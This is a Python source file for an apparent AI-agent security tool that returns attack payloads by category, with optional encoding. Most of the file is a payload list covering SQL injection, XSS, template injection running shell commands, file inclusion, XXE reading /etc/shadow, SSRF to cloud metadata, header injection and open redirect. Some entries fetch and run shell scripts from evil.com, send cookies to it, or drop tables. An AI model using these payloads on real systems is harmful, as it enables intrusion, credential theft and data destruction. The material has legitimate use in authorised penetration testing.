"""
Jack The Shadow — Payload Generator Tool

Generate common security testing payloads by category with optional encoding.
"""

from __future__ import annotations

import base64
import urllib.parse
from typing import TYPE_CHECKING, Any, ClassVar

from jack_the_shadow.tools.base import BaseTool
from jack_the_shadow.tools.helpers import result, truncate
from jack_the_shadow.utils.logger import get_logger

if TYPE_CHECKING:
    from jack_the_shadow.tools.executor import ToolExecutor

logger = get_logger("tools.payload")

# ── Payload Database ─────────────────────────────────────────────────

PAYLOAD_DB: dict[str, list[str]] = {
    "sqli": [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "\" OR \"1\"=\"1\"",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "1' ORDER BY 1--",
        "1' ORDER BY 10--",
        "' AND 1=1--",
        "' AND 1=2--",
        "'; DROP TABLE users--",
        "1; WAITFOR DELAY '0:0:5'--",
        "1' AND SLEEP(5)--",
        "' OR 1=1 LIMIT 1--",
        "admin'--",
        "') OR ('1'='1",
        "1' AND (SELECT COUNT(*) FROM users)>0--",
        "' UNION SELECT username,password FROM users--",
        "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
    ],
    "xss": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "\"><script>alert('XSS')</script>",
        "javascript:alert('XSS')",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<details open ontoggle=alert('XSS')>",
        "<marquee onstart=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>",
        "'-alert('XSS')-'",
        "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "{{constructor.constructor('alert(1)')()}}",
        "<a href=javascript:alert('XSS')>click</a>",
        "';alert('XSS')//",
        "<img src=\"x\" onerror=\"alert('XSS')\">",
        "<div style=\"background:url(javascript:alert('XSS'))\">",
        "\"onfocus=\"alert('XSS')\" autofocus=\"",
        "<script>fetch('https://evil.com/?c='+document.cookie)</script>",
    ],
    "ssti": [
        "{{7*7}}",
        "${7*7}",
        "#{7*7}",
        "<%= 7*7 %>",
        "{{config}}",
        "{{self.__class__.__mro__}}",
        "{{''.__class__.__mro__[2].__subclasses__()}}",
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "{% import os %}{{os.popen('id').read()}}",
        "{{lipsum.__globals__['os'].popen('id').read()}}",
        "{{cycler.__init__.__globals__.os.popen('id').read()}}",
        "{{joiner.__init__.__globals__.os.popen('id').read()}}",
        "{{namespace.__init__.__globals__.os.popen('id').read()}}",
    ],
    "lfi": [
        "../../../../etc/passwd",
        "....//....//....//etc/passwd",
        "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "/etc/passwd%00",
        "..%252f..%252f..%252fetc/passwd",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://input",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
        "expect://id",
        "/proc/self/environ",
        "/proc/self/fd/0",
        "/var/log/apache2/access.log",
        "file:///etc/passwd",
        "..%c0%af..%c0%af..%c0%afetc/passwd",
        "....//....//....//....//etc/shadow",
    ],
    "rfi": [
        "http://evil.com/shell.txt",
        "http://evil.com/shell.php",
        "https://evil.com/shell.txt%00",
        "//evil.com/shell.txt",
        "ftp://evil.com/shell.txt",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
        "http://evil.com/shell.txt?",
        "http://evil.com/shell.txt#",
    ],
    "cmdi": [
        "; id",
        "| id",
        "|| id",
        "& id",
        "&& id",
        "`id`",
        "$(id)",
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "127.0.0.1; id",
        "127.0.0.1 | id",
        "127.0.0.1 && id",
        "; ping -c 3 evil.com",
        "|nslookup evil.com",
        "; curl http://evil.com/shell.sh | bash",
        "$(curl http://evil.com/shell.sh | bash)",
        "; wget http://evil.com/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh",
        "%0a id",
        "127.0.0.1%0a%0did",
        "{{7*7}}",
    ],
    "xxe": [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]>',
        '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/shadow">]><data>&file;</data>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>',
    ],
    "ldap": [
        "*)(uid=*))(|(uid=*",
        "admin)(&)",
        "admin)(|(password=*))",
        "*()|&'",
        "*)(objectClass=*",
        "*)(&(objectClass=user)(uid=*",
        "admin)(!(&(1=0)))",
        "*))%00",
    ],
    "xpath": [
        "' or '1'='1",
        "' or ''='",
        "x' or name()='username' or 'x'='y",
        "'] | //user/*[contains(*,'",
        "') or count(parent::*[position()=1])=0 or ('",
        "1 or 1=1",
        "' or 1=1 or ''='",
        "admin' or '1'='1",
    ],
    "ssrf": [
        "http://127.0.0.1",
        "http://localhost",
        "http://0.0.0.0",
        "http://[::1]",
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://100.100.100.200/latest/meta-data/",
        "http://169.254.169.254/metadata/v1/",
        "http://0177.0000.0000.0001",
        "http://2130706433",
        "http://0x7f000001",
        "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a",
        "dict://127.0.0.1:6379/info",
        "file:///etc/passwd",
        "http://127.0.0.1:22",
    ],
    "idor": [
        "id=1", "id=2", "id=0", "id=-1", "id=999999",
        "user_id=1", "user_id=2",
        "account=1", "account=2",
        "order_id=1", "order_id=2",
        "doc_id=1", "doc_id=2",
        "profile/1", "profile/2",
        "api/v1/users/1", "api/v1/users/2",
        "invoice/1001", "invoice/1002",
    ],
    "traversal": [
        "../", "..\\",
        "..%2f", "..%5c",
        "%2e%2e/", "%2e%2e%5c",
        "..%252f",
        "..%c0%af", "..%c1%9c",
        "..%255c",
        "....//", "....\\\\",
        "..;/",
    ],
    "header_injection": [
        "value\\r\\nInjected-Header: true",
        "value%0d%0aInjected-Header:%20true",
        "value\\r\\nSet-Cookie: session=evil",
        "value%0d%0aContent-Length:%200%0d%0a%0d%0a",
        "value\\nBcc: victim@evil.com",
        "to@victim.com\\nCc: attacker@evil.com",
        "to@victim.com%0ACc:attacker@evil.com",
        "to@victim.com\\r\\nSubject: Hacked",
    ],
    "open_redirect": [
        "//evil.com",
        "/\\evil.com",
        "https://evil.com",
        "//evil.com/%2f..",
        "///evil.com",
        "////evil.com",
        "https:evil.com",
        "http://evil.com@legitimate.com",
        "/redirect?url=http://evil.com",
        "//evil.com\\@legitimate.com",
        "javascript:alert(1)//",
        "data:text/html,<script>alert(1)</script>",
    ],
}

VALID_CATEGORIES = sorted(PAYLOAD_DB.keys())
VALID_ENCODINGS = ("none", "url", "base64", "hex", "double_url", "unicode")


# ── Schema ───────────────────────────────────────────────────────────

class PayloadGenerateTool(BaseTool):
    name: ClassVar[str] = "payload_generate"
    description: ClassVar[str] = (
        "Generate common security testing payloads by category. "
        "Supports SQL injection, XSS, SSTI, LFI/RFI, command injection, "
        "XXE, LDAP injection, path traversal and more."
    )
    risk_aware: ClassVar[bool] = False

    @classmethod
    def parameters_schema(cls) -> dict[str, Any]:
        return {
            "type": "object",
            "properties": {
                "category": {
                    "type": "string",
                    "enum": VALID_CATEGORIES,
                    "description": "Payload category to generate.",
                },
                "encode": {
                    "type": "string",
                    "enum": list(VALID_ENCODINGS),
                    "description": "Encoding to apply (default: none).",
                },
                "max_results": {
                    "type": "integer",
                    "description": "Maximum payloads to return (default: 10, max: 50).",
                },
            },
            "required": ["category"],
        }


# ── Encoding helpers ─────────────────────────────────────────────────

def _encode_payload(payload: str, encoding: str) -> str:
    if encoding == "url":
        return urllib.parse.quote(payload)
    if encoding == "base64":
        return base64.b64encode(payload.encode()).decode()
    if encoding == "hex":
        return payload.encode().hex()
    if encoding == "double_url":
        return urllib.parse.quote(urllib.parse.quote(payload))
    if encoding == "unicode":
        return "".join(f"\\u{ord(c):04x}" for c in payload)
    return payload


# ── Handler ──────────────────────────────────────────────────────────

def handle_payload_generate(
    executor: "ToolExecutor",
    category: str,
    encode: str = "none",
    max_results: int = 10,
) -> dict[str, str]:
    """Generate security testing payloads for the given category."""
    category = category.lower().strip()
    if category not in PAYLOAD_DB:
        return result(
            "error",
            message=f"Unknown category: {category}. Valid: {', '.join(VALID_CATEGORIES)}",
        )

    encode = encode.lower().strip() if encode else "none"
    if encode not in VALID_ENCODINGS:
        return result(
            "error",
            message=f"Unknown encoding: {encode}. Valid: {', '.join(VALID_ENCODINGS)}",
        )

    max_results = max(1, min(max_results, 50))
    payloads = PAYLOAD_DB[category][:max_results]

    if encode != "none":
        payloads = [_encode_payload(p, encode) for p in payloads]

    header = f"[payload_generate] Category: {category} | Encoding: {encode} | Count: {len(payloads)}"
    lines = [header, ""]
    for i, p in enumerate(payloads, 1):
        lines.append(f"  {i}. {p}")

    output = "\n".join(lines)
    logger.info("payload_generate — category=%s encode=%s count=%d", category, encode, len(payloads))
    return result("success", output=truncate(output))
